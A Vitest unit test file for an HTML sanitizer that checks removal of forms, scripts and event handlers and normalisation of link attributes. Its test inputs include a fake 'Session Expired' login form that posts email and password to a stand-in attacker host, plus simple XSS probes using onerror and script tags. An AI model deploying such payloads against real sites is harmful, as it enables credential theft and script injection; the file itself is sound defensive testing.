import { describe, it, expect } from 'vitest'
import { sanitizeRichHTML } from '@/utils/sanitizeRichHTML'

describe('sanitizeRichHTML', () => {
	it('strips phishing form elements', () => {
		const payload =
			'<form action="https://attacker.test/steal" method="post">' +
			'<h2>Session Expired</h2>' +
			'<input name="email"><input name="password" type="password">' +
			'<button type="submit">Login</button></form>'
		const out = sanitizeRichHTML(payload)
		expect(out).not.toMatch(/<form/i)
		expect(out).not.toMatch(/<input/i)
		expect(out).not.toMatch(/<button/i)
		expect(out).not.toMatch(/attacker\.test\/steal/i)
		// non-interactive content inside the form survives
		expect(out).toMatch(/Session Expired/)
	})

	it('strips script and event handlers (DOMPurify default)', () => {
		expect(sanitizeRichHTML('<img src=x onerror=alert(1)>')).not.toMatch(/onerror/i)
		expect(sanitizeRichHTML('<script>alert(1)</script>hi')).not.toMatch(/<script/i)
	})

	it('preserves rich presentational HTML and styling classes', () => {
		const rich =
			'<div class="prose"><h2>Title</h2><p>Para</p>' +
			'<table><thead><tr><th>A</th></tr></thead>' +
			'<tbody><tr><td>1</td></tr></tbody></table>' +
			'<ul><li>item</li></ul>' +
			'<a href="https://docs.frappe.io/learning">link</a>' +
			'<img src="https://example.test/a.png"></div>'
		const out = sanitizeRichHTML(rich)
		expect(out).toMatch(/<div class="prose">/)
		expect(out).toMatch(/<table>/)
		expect(out).toMatch(/<th>A<\/th>/)
		// The anchor now carries target/rel injected by the afterSanitizeAttributes
		// hook — assert the href is preserved without pinning attribute order.
		expect(out).toMatch(/<a\s[^>]*href="https:\/\/docs\.frappe\.io\/learning"/)
		expect(out).toMatch(/<img src="https:\/\/example\.test\/a\.png">/)
	})

	it('opens all anchors in a new tab with safe rel', () => {
		// Bare <a href> (as produced by EditorJS's built-in link tool) must
		// gain target="_blank" and rel="noopener noreferrer" so lesson /
		// quiz / assignment / course-description hyperlinks don't navigate
		// away in the current tab.
		const out = sanitizeRichHTML('<a href="https://example.test">click</a>')
		expect(out).toMatch(/target="_blank"/)
		expect(out).toMatch(/rel="noopener noreferrer"/)
	})

	it('overrides existing target/rel on anchors', () => {
		// Even if the source specifies target="_self" or a different rel,
		// the hook normalises to _blank + noopener noreferrer.
		const out = sanitizeRichHTML(
			'<a href="https://example.test" target="_self" rel="nofollow">click</a>',
		)
		expect(out).toMatch(/target="_blank"/)
		expect(out).toMatch(/rel="noopener noreferrer"/)
		expect(out).not.toMatch(/target="_self"/)
		expect(out).not.toMatch(/rel="nofollow"/)
	})

	it('handles empty/null input', () => {
		expect(sanitizeRichHTML('')).toBe('')
		// @ts-expect-error null tolerated at runtime
		expect(sanitizeRichHTML(null)).toBe('')
	})
})
